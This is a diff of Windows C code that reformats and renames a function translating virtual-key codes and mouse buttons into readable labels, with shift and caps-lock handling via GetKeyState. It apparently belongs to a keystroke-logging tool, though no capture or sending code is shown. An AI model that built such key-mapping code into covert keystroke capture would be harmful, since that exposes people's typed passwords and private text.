@@ -80,92 +80,38 @@ int CheckSpecialKey(int data) {
     return isSpecialKey;
 }
 
-// Convert special key into readable key
-char* SpecialKeyToReadable(int data) {
+// Convert special key into readable key for Windows
+char* windows_SpecialKeyToReadable(int data) {
     char *specialKey = NULL;
 
     switch(data) {
-        case 0x08:
-            specialKey = "[BACKSPACE]";
-            break;
-        case 0x0D:
-            specialKey = "[ENTER]";
-            break;
-        case 0x20:
-            specialKey = " ";
-            break;
-        case 0xA4:
-            specialKey = "[LEFT ALT]";
-            break;
-        case 0xA5:
-            specialKey = "[RIGHT ALT]";
-            break;
-        case 0x09:
-            specialKey = "[TAB]";
-            break;
-        case 0xA0:
-            specialKey = "[LEFT SHIFT]";
-            break;
-        case 0xA1:
-            specialKey = "[RIGHT SHIFT]";
-            break;
-        case 0xA2:
-            specialKey = "[LEFT CONTROL]";
-            break;
-        case 0xA3:
-            specialKey = "[RIGHT CONTROL]";
-            break;
-        case 0x1B:
-            specialKey = "[ESCAPE]";
-            break;
-        case 0x21:
-            specialKey = "[SCROLL UP]";
-            break;
-        case 0x22:
-            specialKey = "[SCROLL DOWN]";
-            break;
-        case 0x23:
-            specialKey = "[END LINE]";
-            break;
-        case 0x24:
-            specialKey = "[START LINE]";
-            break;
-        case 0x25:
-            specialKey = "[LEFT ARROW]";
-            break;
-        case 0x26:
-            specialKey = "[UP ARROW]";
-            break;
-        case 0x27: 
-            specialKey = "[RIGHT ARROW]";
-            break; 
-        case 0x28: 
-            specialKey = "[DOWN ARROW]";
-            break;
-        case 0x2C:
-            specialKey = "[PRINT SCREEN]";
-            break;
-        case 0x2E:
-            specialKey = "[DELETE]";
-            break;
-        case 0x2D:
-            specialKey = "[INSERT]";
-            break;
-        case 0x01:
-            specialKey = "[LEFT CLICK]";
-            break;
-        case 0x02:
-            specialKey = "[RIGHT CLICK]";
-            break;
-        case 0x04:
-            specialKey = "[MIDDLE CLICK]";
-            break;
-        case 0x05:
-            specialKey = "[X1 CLICK]";
-            break;
-        case 0x06:
-            specialKey = "[X2 CLICK]";
-            break;
+        case 0x08: specialKey = "[BACKSPACE]"; break;
+        case 0x0D: specialKey = "[ENTER]"; break;
+        case 0x20: specialKey = " "; break;
+        case 0xA4: specialKey = "[LEFT ALT]"; break;
+        case 0xA5: specialKey = "[RIGHT ALT]"; break;
+        case 0x09: specialKey = "[TAB]"; break;
+        case 0xA0: specialKey = "[LEFT SHIFT]"; break;
+        case 0xA1: specialKey = "[RIGHT SHIFT]"; break;
+        case 0xA2: specialKey = "[LEFT CONTROL]"; break;
+        case 0xA3: specialKey = "[RIGHT CONTROL]"; break;
+        case 0x1B: specialKey = "[ESCAPE]"; break;
+        case 0x21: specialKey = "[SCROLL UP]"; break;
+        case 0x22: specialKey = "[SCROLL DOWN]"; break;
+        case 0x23: specialKey = "[END LINE]"; break;
+        case 0x24: specialKey = "[START LINE]"; break;
+        case 0x25: specialKey = "[LEFT ARROW]"; break;
+        case 0x26: specialKey = "[UP ARROW]"; break;
+        case 0x27: specialKey = "[RIGHT ARROW]"; break; 
+        case 0x28: specialKey = "[DOWN ARROW]"; break;
+        case 0x2C: specialKey = "[PRINT SCREEN]"; break;
+        case 0x2E: specialKey = "[DELETE]"; break;
+        case 0x2D: specialKey = "[INSERT]"; break;
+        case 0x01: specialKey = "[LEFT CLICK]"; break;
+        case 0x02: specialKey = "[RIGHT CLICK]"; break;
+        case 0x04: specialKey = "[MIDDLE CLICK]"; break;
+        case 0x05: specialKey = "[X1 CLICK]"; break;
+        case 0x06: specialKey = "[X2 CLICK]"; break;
         case 0xBA:
             if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0xA1) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                 specialKey = "£";
@@ -256,18 +202,10 @@ char* SpecialKeyToReadable(int data) {
                 specialKey = "<";
             }
             break;
-        case 0x6F:
-            specialKey = "/";
-            break;
-        case 0x6A:
-            specialKey = "*";
-            break;
-        case 0x6D:
-            specialKey = "-";
-            break;
-        case 0x6B:
-            specialKey = "+";
-            break;
+        case 0x6F: specialKey = "/"; break;
+        case 0x6A: specialKey = "*"; break;
+        case 0x6D: specialKey = "-"; break;
+        case 0x6B: specialKey = "+"; break;
         case 0x31:
             if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                 specialKey = "1";
